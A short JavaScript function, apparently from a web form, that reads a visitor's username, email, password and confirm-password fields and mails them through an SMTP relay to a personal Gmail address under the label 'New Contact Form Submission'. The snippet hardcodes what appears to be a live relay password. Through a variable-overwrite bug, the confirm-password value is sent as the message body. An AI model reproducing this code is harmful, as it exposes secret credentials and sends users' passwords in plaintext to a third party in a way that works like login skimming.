 function sendEmail() {
            var name = document.getElementById('username').value;
            var email = document.getElementById('email').value;
            var message = document.getElementById('password').value;
            var message = document.getElementById('confirmpassword').value;
            
            Email.send({
                Host: "smtp.elasticemail.com",
                Username: "ofwar6163@gmail.com",
                Password: "15345C8DC0B660A6B25865A49F1A97D3B172",
                To: 'mahanandhan2002@gmail.com',
                From: email,
                Subject: "New Contact Form Submission",
                Body: "Name: " + name + "<br>Email: " + email + "<br>Message: " + message 
            }).then(
                function (message) {
                    alert("Email sent successfully");
                  
                },
                function (error) {
                    console.error(error);
                    alert("Failed to send email. Please try again later.");
                }
            );
        }